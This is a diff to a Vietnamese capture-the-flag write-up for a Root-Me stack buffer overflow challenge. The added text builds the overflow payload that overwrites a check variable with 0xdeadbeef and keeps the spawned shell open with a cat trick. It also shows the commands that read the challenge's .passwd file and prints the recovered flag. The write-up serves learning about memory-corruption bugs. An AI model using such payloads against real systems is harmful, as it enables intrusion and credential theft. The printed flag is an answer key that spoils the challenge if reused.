@@ -2,6 +2,7 @@
 ```html
 ELF x86 - Stack buffer overflow basic 1 :  ssh -p 2222 app-systeme-ch13@challenge02.root-me.org
 ```
+![image](https://user-images.githubusercontent.com/64201705/119267106-82396000-bc17-11eb-9fd0-b01bcdd084cc.png)
 
 ## Write up
 
@@ -60,12 +61,34 @@ app-systeme-ch13@challenge02:~$ python -c "print 'A'*40 + 'LDLD'" | ./ch13
 
 You are on the right way!
 ```
+![image](https://user-images.githubusercontent.com/64201705/119267147-9c733e00-bc17-11eb-8abe-3a7c3ac480da.png)
+
 Như kết quả in ra ta thấy biến check nhận giá trị là 0x4c444c44 ~ LDLD (hex -> text). Do đó để biến check nhận giá trị là 0xdeadbeef, ta sẽ thay đổi câu lệnh thành:
 ```Bash
-app-systeme-ch13@challenge02:~$ python -c "print 'A'*40 + 'LDLD'" | ./ch13 
+app-systeme-ch13@challenge02:~$ python -c "print 'A'*40 + '\xef\xbe\xad\xde'" | ./ch13 
 
-[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDD
-[check] 0x4c444c44
-
-You are on the right way!
+[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
+[check] 0xdeadbeef
+Yeah dude! You win!
+Opening your shell...
+Shell closed! Bye.
+``` 
+Như trên, ta thấy đã chạy được lệnh để gọi shell nhưng chưa thể vào shell và giữ shell hoạt động, ta cần chỉnh lại một chút về câu lệnh bash phía trên thành:
+```Bash
+app-systeme-ch13@challenge02:~$ cat <(python -c "print 'A'*40 + '\xef\xbe\xad\xde'") - | ./ch13
 ```
+Dấu - ở giữa cat và | sẽ giữ cho shell hoạt động và không bị tắt
+```Bash
+app-systeme-ch13@challenge02:~$ cat <(python -c "print 'A'*40 + '\xef\xbe\xad\xde'") - | ./ch13
+
+[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
+[check] 0xdeadbeef
+Yeah dude! You win!
+Opening your shell...
+id
+uid=1213(app-systeme-ch13-cracked) gid=1113(app-systeme-ch13) groups=1113(app-systeme-ch13),100(users)
+cat .passwd
+1w4ntm0r3pr0np1s
+```
+Vậy flag hay password ở đây là:
+## 1w4ntm0r3pr0np1s
